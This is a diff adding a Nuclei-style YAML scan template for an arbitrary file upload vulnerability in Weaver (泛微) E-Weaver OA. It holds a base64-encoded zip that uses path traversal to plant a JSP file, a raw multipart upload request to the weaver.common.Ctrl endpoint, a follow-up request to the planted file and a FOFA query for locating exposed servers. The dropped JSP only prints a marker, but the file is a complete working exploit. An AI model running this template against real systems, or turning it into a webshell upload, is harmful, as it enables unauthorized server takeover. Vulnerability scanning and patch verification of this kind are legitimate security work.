@@ -1,0 +1,53 @@
+id: poc-local-oa-weaver-ecology-weaver-common-Ctrl-upload
+
+info:
+  name: 泛微OA E-Weaver weaver.common.Ctrl 任意文件上传漏洞
+  author: capiton
+  severity: critical
+  description: 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20weaver.common.Ctrl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+    Vulnerability-Impact: 泛微OA V9
+  tags: weaver,ecology,fanwei
+
+variables:
+  upload_filename: '{{rand_text_alphanumeric(8, "")}}'
+  old_payload: '{{base64_decode("UEsDBBQAAAAIAG5jeFTN12WHIgAAACAAAAAVAAAALi4vLi4vLi4vWkI5ZVdrejIuanNwszBKMzdLMkozMTMyszAwTUxNtjRPSUoyMUgyNElLM0kGAFBLAQIUAxQAAAAIAG5jeFTN12WHIgAAACAAAAAVAAAAAAAAAAAAAACAAQAAAAAuLi8uLi8uLi9aQjllV2t6Mi5qc3BQSwUGAAAAAAEAAQBDAAAAVQAAAAAA")}}'
+  payload: '{{replace(old_payload, "ZB9eWkz2", upload_filename)}}'
+  
+
+requests:
+  - raw:
+      - |-
+        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=be25c47caa26e1bf3adf8f0917a90965
+        Accept-Encoding: gzip
+
+        --be25c47caa26e1bf3adf8f0917a90965
+        Content-Disposition: form-data; name="file1"; filename="{{upload_filename}}.zip
+        Content-Type: application/zip
+
+        {{payload}}
+        --be25c47caa26e1bf3adf8f0917a90965--
+
+  - method: GET
+    path:
+      - "{{RootURL}}/cloudstore/{{upload_filename}}.jsp"
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "82f76b2f4626805aec97dbb40b14ff4c"
